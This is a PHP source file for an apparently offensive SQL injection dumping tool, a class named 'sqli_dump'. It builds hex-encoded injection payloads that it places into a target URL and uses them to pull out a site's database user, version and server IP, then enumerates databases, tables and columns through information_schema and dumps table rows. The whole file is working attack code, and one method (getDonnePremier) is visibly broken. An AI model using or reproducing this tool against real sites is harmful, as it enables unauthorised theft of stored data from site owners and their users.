<?php
class sqli_dump
{
	public $separateur = '!~!';
    public $s_separateur = '3!P';
    public $var_n = '[t]';
	public $url_point;
    private $hr;
    private $ch;

    function __construct()
    {
        $this->hr = new Curl();
        $this->ch = new chaine();
    }

    public function getFirst()
    {
        $inj = 'concat(' . $this->ch->getHex($this->separateur) . ',concat(user(),' . $this->ch->getHex($this->s_separateur) . ',version(),' . $this->ch->getHex($this->s_separateur) . ',database()),' . $this->ch->getHex($this->separateur) . ')';
				$inj = $this->ch->Encode($inj);
        $url_g = str_replace($this->var_n, $inj, $this->url_point);
        $page = $this->hr->getA($url_g);

        if (strpos($page, $this->separateur) !== false){
            $rslt = $this->ch->extSubResult($this->s_separateur, $this->ch->extResult($this->separateur, $page));
            $hote = explode('/', $this->url_point);
            $ip = gethostbyname($hote[2]);
			$arr = array(
				'user' => $rslt[0],
				'version' => $rslt[1],
				'ip' => $ip,
				'url_point' => $this->url_point,

                'diagram' => array(
                    array('name' => $rslt[2], 'checked' => false, 'childs' => (object)array())
                )
			);
            return $arr;
        }
        else
        {
            return false;
        }
    }
    public function getAllDb()
    {
        $nbr = 0;
        try { $nbr = $this->getNombreDB(); }
        catch (Exception $e) { }
        $inj = '(select distinct concat(' . $this->ch->getHex($this->separateur) . ',group_concat(schema_name),' . $this->ch->getHex($this->separateur) . ') from information_schema.schemata where not schema_name=' . $this->ch->getHex('information_schema') . ')';
				$inj = $this->ch->Encode($inj);
        $url_f = str_replace($this->var_n, $inj, $this->url_point);
        $page = $this->hr->get($url_f);
        $dbbrut = $this->ch->extResult($this->separateur, $page);

        if ($nbr > 1) {
            $a = explode(',', $dbbrut);
			$b = array();
			foreach ($a as $k => $v) {
				$b[] = array('name' => $this->clearStr($v), 'checked' => false, 'childs' => array());
			}
			return $b;
        } else {
			return array('name' => $dbbrut, 'checked' => false, 'childs' => array());
        }
    }
    public function getTable($db_name)
    {
        $nbr = 0;
        try { $nbr = $this->getNombreTable($db_name); }
        catch (Exception $e) { }
        $inj = '(select distinct concat(' . $this->ch->getHex($this->separateur) . ',unhex(Hex(cast(group_concat(table_name) as char))),' . $this->ch->getHex($this->separateur) . ') from information_schema.tables where table_schema=' . $this->ch->getHex($db_name) . ')';
				$inj = $this->ch->Encode($inj);
				$url_f = str_replace($this->var_n, $inj, $this->url_point);
        $page = $this->hr->get($url_f);
        $tablebrut = $this->ch->extResult($this->separateur, $page);

        if ($nbr > 1) {
			$a = explode(',', $tablebrut);
			$b = array();
			foreach ($a as $k => $v) {
				$b[] = array('name' => $this->clearStr($v)/*strip_tags($v)*/, 'checked' => false, 'childs' => array());
			}
			return $b;
        } else {
		 	return array($tablebrut => array());
        }
    }
    public function getColonne($db_name, $table_name)
    {
    	$nbr = 0;
        try { $nbr = $this->getNombreColonne($db_name, $table_name); }
        catch (Exception $e) { }
        $inj = '(select distinct concat(' . $this->ch->getHex($this->separateur) . ',unhex(Hex(cast(group_concat(column_name) as char))),' . $this->ch->getHex($this->separateur) . ') from information_schema.columns where table_schema=' . $this->ch->getHex($db_name) . ' and table_name=' . $this->ch->getHex($table_name) . ')';
    	$inj = $this->ch->Encode($inj);
    	$url_f = str_replace($this->var_n, $inj, $this->url_point);
        $page = $this->hr->get($url_f);
        $colonnebrut = $this->ch->extResult($this->separateur, $page);

        if ($nbr > 1) {
    		$a = explode(',', $colonnebrut);
    		$b = array();
    		foreach ($a as $k => $v) {
    			$b[] = array('name' => $this->clearStr($v), 'checked' => false, 'childs' => array());
    		}
    		return $b;
        }
        else
        {
    		return array($colonnebrut => array());
        }
    }

	public function getDonnePremier($chemin_node)
    {
        foreach ($item as $chemin_node)
        {
            $mrc = explode('\\' ,$item);
            if (count($mrc) > 2)
            {
                $nbr_row = 0;
                $nbr_row = $this->getNombreDonne($mrc[0], $mrc[1]);
                $colonne = explode('[-COL]',  $mrc[2]);
				return array('');
            }
        }
    }

	public function getRow($db_name, $table_name, $colonne, $nbr_row)
	{
		$inj = "(select concat(" . $this->BuildQuery($colonne) . ") from " . $db_name . "." . $table_name . " limit " . $nbr_row . ",1)";
		$inj = $this->ch->Encode($inj);
        $url_f = str_replace($this->var_n, $inj, $this->url_point);

		$page = $this->hr->get($url_f);

		$data = $this->ch->extResult($this->separateur, $page);
		$rL = explode($this->s_separateur, $data);

		if ($this->checkAllEmpty($rL)){
            return $rL;
		}
        return $rL;
	}
    private function checkAllEmpty($array)
    {
        foreach ($array as $item) {
            if($item != '')
                return true;
        }
        return false;
    }
    private function BuildQuery($colonne)
    {
        $query_r = '';
        $i = 0;
        foreach ($colonne as $element)
        {
            if ($i == 0){
                $query_r .= $this->ch->getHex($this->separateur) . ",ifnull(" . $element . ",char(32)),";
            }else if ($i == count($colonne) - 1){
                $query_r .= $this->ch->getHex($this->s_separateur) . ",ifnull(" . $element . ",char(32))," . $this->ch->getHex($this->separateur);
            }else{
                $query_r .= $this->ch->getHex($this->s_separateur) . ",ifnull(" . $element . ",char(32)),";
            }
            $i++;
        }
        return $query_r;
    }
	public function getNombreDonne($db_name, $tb_name)
    {
		$inj = '(select concat(' . $this->ch->getHex($this->separateur) . ',count(0),' . $this->ch->getHex($this->separateur) . ') from ' . $db_name . '.' . $tb_name . ')';
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
    private function getNombreColonne($db_name, $tb_name)
    {
        $inj = '(select concat(' . $this->ch->getHex($this->separateur) . ',count(0),' . $this->ch->getHex($this->separateur) . ') from information_schema.columns where table_schema=' . $this->ch->getHex($db_name) . ' and table_name='.$this->ch->getHex($tb_name).')';
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
    private function getNombreTable($db_name)
    {
        $inj = '(select concat(' . $this->ch->getHex($this->separateur) . ',count(0),' . $this->ch->getHex($this->separateur) . ') from information_schema.tables where table_schema=' . $this->ch->getHex($db_name) . ')';
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }
    private function getNombreDB()
    {
        $inj = '(select concat(' . $this->ch->getHex($this->separateur) . ',count(0),' . $this->ch->getHex($this->separateur) . ') from information_schema.schemata where not schema_name=' . $this->ch->getHex('information_schema') . ')';
        $url_f = str_replace($this->var_n, $this->ch->Encode($inj), $this->url_point);
        $page = $this->hr->get($url_f);
        return intval($this->ch->extResult($this->separateur, $page));
    }

    private function clearStr($str)
    {
        if (strpos($str, '<') !== false) {
            $m = explode('<', $str);
            $str = current($m);
        } else {
            $str = $str;
        }

        if (strpos($str, '>') !== false) {
            $m = explode('>', $str);
            $str = $m[1];
        } else {
            $str = $str;
        }
        return $str;
    }  
}
